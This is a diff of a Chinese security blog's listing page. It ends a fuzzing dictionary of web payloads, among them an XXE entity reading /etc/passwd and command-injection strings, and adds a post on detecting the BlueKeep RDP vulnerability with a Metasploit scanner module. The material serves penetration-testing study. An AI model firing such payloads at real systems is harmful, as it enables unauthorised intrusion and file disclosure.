+&lt;?xml version=&quot;1.0&quot;?&gt;&lt;change-log&gt;&lt;text&gt;Hello World&lt;/text&gt;&lt;/change-log&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe7eb97 SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+| ping -i 30 127.0.0.1 |
+&amp; ping -i 30 127.0.0.1 &amp;
+?url=http://www.zhihu.com/
+?url=https://www.zhihu.com/
+http://www.lonelyor.org/
+https://www.lonelyor.org/
+$ENV{&#39;HOME&#39;}
+2.2250738585072011e-308
+01/01/1979
+*~1*/.aspx
+a*~1*/.aspx
+&lt;h1&gt;haha&lt;/h1&gt;
 </code></pre>
 
                         
@@ -576,10 +551,53 @@ Committed revision 1135.
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2019/5/24 13:48 下午</span>
+                    <span class="date">2019/6/4 10:59 上午</span>
                     <span>posted in&nbsp;</span> 
           				  
-          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15595455557551.html">
+                
+                  <h1>使用 msf 检测 cve-2019-0708 WindowsRDP 远程代码执行漏洞</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>MSF模块：<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</a></p>
+
+<p>前提：先在终端中更新 msf，使用命令<code>msfupdate</code>；如果没法更新，而 msf 版本又低就去 github 下载 msf 模块。</p>
+
+<p>现在开始验证：<br/>
+1、终端输入<code>msf</code>启动 msf<br/>
+2、使用 cve_2019_0708_bluekeep 模块：<code>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code><br/>
+3、设置目标计算机 ip：<code>set RHOSTS 192.168.1.1</code>，如果是域名，可以先 ping 得出 ip 地址。<br/>
+4、输入<code>exploit</code>开始检测，如果出现方框中的内容，则表示漏洞存在（相关 ip 已打码）。</p>
+
+<p><figure><img src="media/15595455557551/15595462320619.jpg" alt=""/></figure></p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/6/3 15:5 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
           				   
                   </div>
                   <div class="more-right right">
@@ -656,7 +674,7 @@ Committed revision 1135.
         
             <a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html"><strong>数据库</strong></a>
         
-            <a href="Web%E5%AE%89%E5%85%A8.html"><strong>Web安全</strong></a>
+            <a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html"><strong>渗透测试</strong></a>
         
             <a href="%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html"><strong>风花雪月</strong></a>
         
@@ -677,31 +695,31 @@ Committed revision 1135.
 	      
 		      
 			      <li class="post">
-			        <a href="15604965103558.html">Docker for Mac 卡在 "is starting"</a>
+			        <a href="15642124072307.html">Mutillidae 遇到的一个奇怪问题</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15602308144902.html">Metasploit 完全使用教程</a>
+			        <a href="15641083818915.html">manjaro更改国内源操作</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15597856399146.html">黑盒测试中的信息收集</a>
+			        <a href="15640473747565.html">kali 下更新软件时报错，说下列签名无效的解决办法</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15596178265897.html">业务逻辑漏洞安全检查checklist</a>
+			        <a href="15638711886127.html">Archiso</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15596171974228.html">最近做了个 fuzzing 字典精简版</a>
+			        <a href="15611953556975.html">archlinux 安装 vmtools 遇到坑了怎么办</a>
 			      </li>
 		     
 		  
